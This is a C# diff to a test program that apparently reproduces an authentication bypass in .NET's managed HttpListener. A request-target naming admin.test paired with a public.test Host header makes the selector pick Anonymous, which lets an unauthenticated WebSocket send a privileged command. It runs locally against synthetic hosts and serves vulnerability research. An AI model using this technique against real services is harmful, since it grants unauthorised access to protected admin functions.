@@ -8,21 +8,10 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-record Result(
-    string Name,
-    string FirstLine,
-    bool BasicChallenge,
-    bool ContextDelivered,
-    AuthenticationSchemes Selected,
-    string SelectorUserHost,
-    string SelectorUrlHost,
-    bool IsWebSocketRequest,
-    bool SwitchingProtocols,
-    bool AdminWsSentinel);
-
 class Program
 {
-    private const string WsSentinel = "ADMIN_WS_CHANNEL_ESTABLISHED_5d91";
+    private const string PrivilegedCommand = "EXECUTE_SYNTHETIC_ADMIN_CHANGE";
+    private const string CommandSentinel = "ADMIN_WS_PRIVILEGED_COMMAND_EXECUTED_0a61";
 
     static int FreePort()
     {
@@ -33,21 +22,72 @@ class Program
         return p;
     }
 
-    static async Task<byte[]> ReadUntilQuiet(NetworkStream ns)
+    static void Require(bool condition,string message)
+    {
+        if(!condition) throw new Exception("ASSERTION_FAILED: "+message);
+    }
+
+    static byte[] BuildMaskedTextFrame(string text)
+    {
+        byte[] payload=Encoding.UTF8.GetBytes(text);
+        if(payload.Length>125) throw new InvalidOperationException("test frame too large");
+
+        byte[] mask={0x11,0x22,0x33,0x44};
+        byte[] frame=new byte[2+4+payload.Length];
+        frame[0]=0x81;
+        frame[1]=(byte)(0x80|payload.Length);
+        Array.Copy(mask,0,frame,2,4);
+
+        for(int i=0;i<payload.Length;i++)
+            frame[6+i]=(byte)(payload[i]^mask[i%4]);
+
+        return frame;
+    }
+
+    static async Task<byte[]> ReadHttpHeaders(NetworkStream ns)
     {
         using var ms=new MemoryStream();
-        byte[] buffer=new byte[8192];
+        byte[] one=new byte[1];
+        using var cts=new CancellationTokenSource(TimeSpan.FromSeconds(5));
+        int matched=0;
+
+        while(true)
+        {
+            int n=await ns.ReadAsync(one,cts.Token);
+            if(n==0) break;
+            ms.WriteByte(one[0]);
+
+            matched=(matched,one[0]) switch
+            {
+                (0,13)=>1,
+                (1,10)=>2,
+                (2,13)=>3,
+                (3,10)=>4,
+                (_,13)=>1,
+                _=>0
+            };
+
+            if(matched==4) break;
+        }
+
+        return ms.ToArray();
+    }
+
+    static async Task<byte[]> ReadRemaining(NetworkStream ns)
+    {
+        using var ms=new MemoryStream();
+        byte[] buf=new byte[4096];
         using var cts=new CancellationTokenSource(TimeSpan.FromSeconds(5));
 
         try
         {
             while(true)
             {
-                int n=await ns.ReadAsync(buffer,cts.Token);
+                int n=await ns.ReadAsync(buf,cts.Token);
                 if(n==0) break;
-                await ms.WriteAsync(buffer.AsMemory(0,n),cts.Token);
+                await ms.WriteAsync(buf.AsMemory(0,n),cts.Token);
 
-                if(ms.Length>0 && !ns.DataAvailable)
+                if(!ns.DataAvailable)
                     await Task.Delay(100,cts.Token);
 
                 if(ms.Length>0 && !ns.DataAvailable)
@@ -55,19 +95,11 @@ class Program
             }
         }
         catch(OperationCanceledException) {}
+
         return ms.ToArray();
     }
 
-    static string FirstHttpLine(byte[] wire)
-    {
-        string s=Encoding.ASCII.GetString(wire);
-        return s.Split(new[]{"\r\n","\n"},StringSplitOptions.None)[0];
-    }
-
-    static bool ContainsAscii(byte[] wire,string value) =>
-        Encoding.ASCII.GetString(wire).Contains(value,StringComparison.OrdinalIgnoreCase);
-
-    static async Task<Result> Run(string name, bool conflicting)
+    static async Task<(string firstLine,bool basic,bool context,bool commandExecuted,AuthenticationSchemes selected,string userHost,string urlHost)> Run(bool conflicting)
     {
         int port=FreePort();
 
@@ -75,23 +107,22 @@ class Program
         listener.Prefixes.Add($"http://public.test:{port}/");
         listener.Prefixes.Add($"http://admin.test:{port}/");
         listener.AuthenticationSchemes=AuthenticationSchemes.None;
-        listener.Realm="admin-ws-research";
+        listener.Realm="admin-ws-command";
 
+        AuthenticationSchemes selected=AuthenticationSchemes.None;
         string selectorUserHost="<not-called>";
         string selectorUrlHost="<not-called>";
-        AuthenticationSchemes selected=AuthenticationSchemes.None;
 
         listener.AuthenticationSchemeSelectorDelegate=request =>
         {
             selectorUserHost=request.UserHostName ?? "<null>";
             selectorUrlHost=request.Url?.Host ?? "<null>";
-            string hostOnly=selectorUserHost.Split(':')[0];
 
-            selected=string.Equals(hostOnly,"public.test",StringComparison.OrdinalIgnoreCase)
+            selected=selectorUserHost.StartsWith("public.test",StringComparison.OrdinalIgnoreCase)
                 ? AuthenticationSchemes.Anonymous
                 : AuthenticationSchemes.Basic;
 
-            Console.WriteLine($"SELECTOR case={name} UserHostName={selectorUserHost} Url.Host={selectorUrlHost} Selected={selected}");
+            Console.WriteLine($"SELECTOR UserHostName={selectorUserHost} Url.Host={selectorUrlHost} Selected={selected}");
             return selected;
         };
 
@@ -102,14 +133,11 @@ class Program
         await client.ConnectAsync(IPAddress.Loopback,port);
         using NetworkStream ns=client.GetStream();
 
-        string requestTarget=conflicting
-            ? $"http://admin.test:{port}/ws"
-            : "/ws";
-
+        string target=conflicting ? $"http://admin.test:{port}/ws-command" : "/ws-command";
         string host=conflicting ? $"public.test:{port}" : $"admin.test:{port}";
 
         string raw=
-            $"GET {requestTarget} HTTP/1.1\r\n"+
+            $"GET {target} HTTP/1.1\r\n"+
             $"Host: {host}\r\n"+
             "Upgrade: websocket\r\n"+
             "Connection: Upgrade\r\n"+
@@ -120,60 +148,78 @@ class Program
         await ns.WriteAsync(Encoding.ASCII.GetBytes(raw));
         await ns.FlushAsync();
 
-        Task<byte[]> wireTask=ReadUntilQuiet(ns);
-        Task first=await Task.WhenAny(contextTask,wireTask,Task.Delay(5000));
-
-        bool delivered=false;
-        bool isWs=false;
-
-        if(first==contextTask && contextTask.IsCompletedSuccessfully)
+        Task server=Task.Run(async () =>
         {
-            delivered=true;
-            HttpListenerContext ctx=await contextTask;
-            isWs=ctx.Request.IsWebSocketRequest;
-
-            Console.WriteLine(
-                $"CONTEXT case={name} UserHostName={ctx.Request.UserHostName} Url.Host={ctx.Request.Url?.Host} User={(ctx.User is null ? "ANONYMOUS" : "AUTHENTICATED")} IsWebSocket={isWs}");
-
-            if(isWs && string.Equals(ctx.Request.Url?.Host,"admin.test",StringComparison.OrdinalIgnoreCase))
+            try
             {
-                HttpListenerWebSocketContext wsContext=await ctx.AcceptWebSocketAsync(subProtocol:null);
-                byte[] msg=Encoding.UTF8.GetBytes(WsSentinel);
-                await wsContext.WebSocket.SendAsync(
-                    new ArraySegment<byte>(msg),
-                    WebSocketMessageType.Text,
-                    endOfMessage:true,
+                HttpListenerContext ctx=await contextTask.WaitAsync(TimeSpan.FromSeconds(5));
+                Console.WriteLine($"CONTEXT UserHostName={ctx.Request.UserHostName} Url.Host={ctx.Request.Url?.Host} User={(ctx.User is null ? "ANONYMOUS":"AUTHENTICATED")} IsWebSocket={ctx.Request.IsWebSocketRequest}");
+
+                if(!ctx.Request.IsWebSocketRequest ||
+                   !string.Equals(ctx.Request.Url?.Host,"admin.test",StringComparison.OrdinalIgnoreCase))
+                {
+                    ctx.Response.StatusCode=400;
+                    ctx.Response.Close();
+                    return;
+                }
+
+                HttpListenerWebSocketContext wsCtx=await ctx.AcceptWebSocketAsync(null);
+
+                byte[] receive=new byte[1024];
+                WebSocketReceiveResult rr=await wsCtx.WebSocket.ReceiveAsync(
+                    new ArraySegment<byte>(receive),
                     CancellationToken.None);
 
-                await wsContext.WebSocket.CloseOutputAsync(
+                string command=Encoding.UTF8.GetString(receive,0,rr.Count);
+                Console.WriteLine($"ADMIN_WS_RECEIVED_COMMAND={command}");
+
+                string reply=command==PrivilegedCommand
+                    ? CommandSentinel
+                    : "COMMAND_REJECTED";
+
+                byte[] replyBytes=Encoding.UTF8.GetBytes(reply);
+                await wsCtx.WebSocket.SendAsync(
+                    new ArraySegment<byte>(replyBytes),
+                    WebSocketMessageType.Text,
+                    true,
+                    CancellationToken.None);
+
+                await wsCtx.WebSocket.CloseOutputAsync(
                     WebSocketCloseStatus.NormalClosure,
                     "done",
                     CancellationToken.None);
             }
-            else
+            catch(Exception ex)
             {
-                ctx.Response.StatusCode=200;
-                ctx.Response.Close();
+                Console.WriteLine($"SERVER_RESULT={ex.GetType().Name}:{ex.Message}");
             }
+        });
+
+        byte[] headers=await ReadHttpHeaders(ns);
+        string headerText=Encoding.ASCII.GetString(headers);
+        string firstLine=headerText.Split(new[]{"\r\n","\n"},StringSplitOptions.None)[0];
+        bool basic=headerText.Contains("WWW-Authenticate: Basic",StringComparison.OrdinalIgnoreCase);
+
+        bool contextDelivered=contextTask.IsCompletedSuccessfully;
+
+        if(firstLine.Contains("101",StringComparison.Ordinal))
+        {
+            byte[] frame=BuildMaskedTextFrame(PrivilegedCommand);
+            await ns.WriteAsync(frame);
+            await ns.FlushAsync();
         }
 
-        byte[] wire=await wireTask;
-        string firstLine=FirstHttpLine(wire);
-        bool basic=ContainsAscii(wire,"WWW-Authenticate: Basic");
-        bool switching=firstLine.Contains("101",StringComparison.Ordinal);
-        bool sentinel=ContainsAscii(wire,WsSentinel);
+        byte[] rest=await ReadRemaining(ns);
+        string restAscii=Encoding.ASCII.GetString(rest);
+        bool commandExecuted=restAscii.Contains(CommandSentinel,StringComparison.Ordinal);
 
-        Console.WriteLine(
-            $"RESULT case={name} first={firstLine} basicChallenge={basic} context={delivered} selected={selected} selectorUserHost={selectorUserHost} selectorUrlHost={selectorUrlHost} isWebSocket={isWs} switchingProtocols={switching} adminWsSentinel={sentinel}");
-
+        await Task.WhenAny(server,Task.Delay(1000));
         listener.Close();
 
-        return new Result(name,firstLine,basic,delivered,selected,selectorUserHost,selectorUrlHost,isWs,switching,sentinel);
-    }
+        Console.WriteLine(
+            $"RESULT conflicting={conflicting} first={firstLine} basicChallenge={basic} context={contextDelivered} selected={selected} selectorUserHost={selectorUserHost} selectorUrlHost={selectorUrlHost} privilegedCommandExecuted={commandExecuted}");
 
-    static void Require(bool condition,string message)
-    {
-        if(!condition) throw new Exception("ASSERTION_FAILED: "+message);
+        return(firstLine,basic,contextDelivered,commandExecuted,selected,selectorUserHost,selectorUrlHost);
     }
 
     static async Task Main()
@@ -181,39 +227,35 @@ class Program
         Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
         Console.WriteLine($"OS={RuntimeInformation.OSDescription}");
 
-        Result adminControl=await Run("ADMIN_WS_CONTROL",conflicting:false);
-        Result attack=await Run("ABSOLUTE_ADMIN_WS_HOST_PUBLIC",conflicting:true);
+        var control=await Run(conflicting:false);
+        Require(control.firstLine.Contains("401"),"ordinary admin WebSocket must require authentication");
+        Require(control.basic,"ordinary admin WebSocket must carry Basic challenge");
+        Require(control.selected==AuthenticationSchemes.Basic,"ordinary admin WebSocket selector must choose Basic");
+        Require(!control.commandExecuted,"ordinary unauthenticated admin WebSocket must not execute privileged command");
 
-        Require(adminControl.FirstLine.Contains("401"),"ordinary admin WebSocket handshake must be challenged");
-        Require(adminControl.BasicChallenge,"ordinary admin WebSocket handshake must include Basic challenge");
-        Require(!adminControl.ContextDelivered,"ordinary unauthenticated admin WebSocket must not reach application context");
-        Require(!adminControl.SwitchingProtocols && !adminControl.AdminWsSentinel,
-            "ordinary unauthenticated admin WebSocket must not establish protected channel");
+        var attack=await Run(conflicting:true);
 
         if(OperatingSystem.IsWindows())
         {
-            Require(attack.FirstLine.Contains("401"),"Windows conflict must return 401");
-            Require(attack.BasicChallenge,"Windows conflict must include Basic challenge");
-            Require(attack.Selected==AuthenticationSchemes.Basic,"Windows selector must select Basic");
-            Require(!attack.ContextDelivered && !attack.SwitchingProtocols && !attack.AdminWsSentinel,
-                "Windows must not establish admin WebSocket");
-            Console.WriteLine("ADMIN_WEBSOCKET_WINDOWS_NEGATIVE_CONTROL=PASS");
+            Require(attack.firstLine.Contains("401"),"Windows conflict must require authentication");
+            Require(attack.basic,"Windows conflict must carry Basic challenge");
+            Require(attack.selected==AuthenticationSchemes.Basic,"Windows selector must choose Basic");
+            Require(!attack.commandExecuted,"Windows must not execute privileged WebSocket command");
+            Console.WriteLine("ADMIN_WS_COMMAND_WINDOWS_NEGATIVE_CONTROL=PASS");
         }
         else
         {
-            Require(attack.FirstLine.Contains("101"),"managed conflict must complete WebSocket upgrade");
-            Require(!attack.BasicChallenge,"managed conflict must omit Basic challenge");
-            Require(attack.Selected==AuthenticationSchemes.Anonymous,"managed selector must choose Anonymous");
-            Require(attack.ContextDelivered && attack.IsWebSocketRequest,
-                "managed conflict must deliver admin WebSocket context");
-            Require(attack.SelectorUserHost.StartsWith("public.test",StringComparison.OrdinalIgnoreCase),
+            Require(attack.firstLine.Contains("101"),"managed conflict must establish WebSocket");
+            Require(!attack.basic,"managed conflict must omit Basic challenge");
+            Require(attack.selected==AuthenticationSchemes.Anonymous,"managed selector must choose Anonymous");
+            Require(attack.userHost.StartsWith("public.test",StringComparison.OrdinalIgnoreCase),
                 "selector must see stale public Host");
-            Require(string.Equals(attack.SelectorUrlHost,"admin.test",StringComparison.OrdinalIgnoreCase),
+            Require(string.Equals(attack.urlHost,"admin.test",StringComparison.OrdinalIgnoreCase),
                 "selector must simultaneously see admin Url authority");
-            Require(attack.SwitchingProtocols && attack.AdminWsSentinel,
-                "protected admin WebSocket channel must be established anonymously");
+            Require(attack.commandExecuted,
+                "privileged command sent over bypassed admin WebSocket must execute");
 
-            Console.WriteLine("ADMIN_WEBSOCKET_AUTH_BYPASS=CONFIRMED");
+            Console.WriteLine("ADMIN_WS_PRIVILEGED_COMMAND_AUTH_BYPASS=CONFIRMED");
         }
     }
 }
